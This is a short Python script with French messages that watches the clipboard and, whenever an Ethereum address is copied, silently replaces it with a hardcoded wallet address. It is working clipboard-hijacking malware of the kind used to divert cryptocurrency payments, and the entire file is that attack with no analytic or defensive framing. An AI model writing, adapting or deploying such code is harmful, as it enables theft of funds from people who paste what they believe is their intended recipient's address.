import pyperclip
import time
import re

pyperclip.set_clipboard("windows")

def is_eth_address(text):
    return re.fullmatch(r"0x[a-fA-F0-9]{40}", text) is not None

last_clipboard = ""
print("🟢 En écoute. Copie une adresse ETH valide...")

while True:
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content != last_clipboard:
            last_clipboard = clipboard_content
            print(f" N : {clipboard_content}")
            if is_eth_address(clipboard_content):
                print(f"D : {clipboard_content} → R")
                pyperclip.copy("0xD0a18045B8A26d5A2C12D803e3020152DA5CD76a")
        time.sleep(0.5)
    except KeyboardInterrupt:
        break
    except Exception as e:
        print(f"Erreur : {e}")
